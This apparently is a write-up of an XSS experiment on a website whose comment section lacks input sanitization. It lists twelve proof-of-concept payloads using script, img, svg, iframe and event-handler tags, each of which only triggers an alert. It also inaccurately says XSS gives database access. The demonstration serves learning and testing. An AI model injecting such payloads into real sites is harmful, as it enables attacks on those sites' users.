# Website Link : 

This website is vulnerable in XXS(Cross-Site Scripting).The user input from the comment section is not validated and sanitized.Due to that, XSS scripts(Javascript codes in usual) can be included in the comments.

# XXS(Cross-Site Scripting) Vulnerability Experiment

## Overview

This section documents the XXS vulnerabilities identified in the website []. The vulnerabilities allow unauthorized access to the database, potentially leading to data exposure and manipulation.

## XSS payloads

### 1. Simple Script Alert:
```HTML
<script>alert(\'SCRIPT ALERT\');</script>
```
Explanation: This payload injects a <script> tag directly into the HTML. When the browser encounters this tag, it executes the JavaScript code inside, causing an alert box to pop up with the message "SCRIPT ALERT".

NOTE : the backslash (\) before the single quote (') inside the string tells the interpreter to treat it as a literal character rather than the end of the string.Because comments are passes through the query to save in database, without using backslash causes error and stop the execution of webpage 

### 2. Image Tag with JavaScript:
```HTML
<img src="x" onerror="alert(\'HACKED\')">
```
Explanation: This payload uses an <img> tag with a broken src attribute (x). The onerror attribute specifies JavaScript code to run if an error occurs while loading the image. In this case, it triggers an alert with the message "HACKED".

### 3. Anchor Tag with JavaScript:
```HTML
<a href="javascript:alert(\'YOUR DEVICE IS HACKED\')">Click me</a>
```
Explanation: This payload uses an <a> (anchor) tag with an href attribute set to a JavaScript URI. When the user clicks the link, the browser executes the JavaScript code, causing an alert with the message "YOUR DEVICE IS HACKED".

### 4. Event Handler in a Div:
```HTML
<div onmouseover="alert(\'Do not Touch me\')">Hover over me</div>
```
Explanation: This payload uses a <div> tag with an onmouseover event handler. When the user hovers over the div, the browser executes the JavaScript code, causing an alert with the message "Do not Touch me".

### 5. Body Tag with Onload Event:
```HTML
<body onload="alert(\'DELETE ME\')">
```
Explanation: This payload uses the <body> tag with an onload event handler. When the page loads, the browser executes the JavaScript code, causing an alert with the message "DELETE ME".

### 6. Encoded Characters:
```HTML
<svg onload=alert(\'SVG loaded\')>
```
Explanation: This payload uses an <svg> (Scalable Vector Graphics) tag with an onload event handler. When the SVG is loaded, the browser executes the JavaScript code, causing an alert with the message "SVG loaded".

### 7. Input Field with JavaScript:
```HTML
<input type="text" value="TEXT" onfocus="alert(\'YOU CAN NOT OVERWRITE\')">
```
Explanation: This payload uses an <input> tag with an onfocus event handler. When the user focuses on the input field (e.g., clicks on it), the browser executes the JavaScript code, causing an alert with the message "YOU CAN NOT OVERWRITE".
Note : After execution of this comment, if you receive alert message continously just reload the page.

### 8. Malicious URL:
```HTML
<a href="https://fruits.selfmade.solutions" onclick="alert(\'Are you sure?\')">Malicious Link</a>
```
Explanation: This payload uses an <a> (anchor) tag with an onclick event handler. When the user clicks the link, the browser executes the JavaScript code, causing an alert with the message "Are you sure?".

### 9. Textarea Tag:
```HTML
<textarea onfocus="alert(\'XSS\')">Focus on me</textarea>
```
Explanation: This payload uses a <textarea> tag with an onfocus event handler. When the user focuses on the textarea (e.g., clicks on it), the browser executes the JavaScript code, causing an alert with the message "XSS".

10. Iframe Tag:

<iframe src="javascript:alert('XSS')"></iframe>

11. Style Tag with JavaScript:

<style>body{background:url("javascript:alert('XSS')");}</style>

12. SVG with Embedded JavaScript:

<svg><script>alert('XSS')</script></svg>
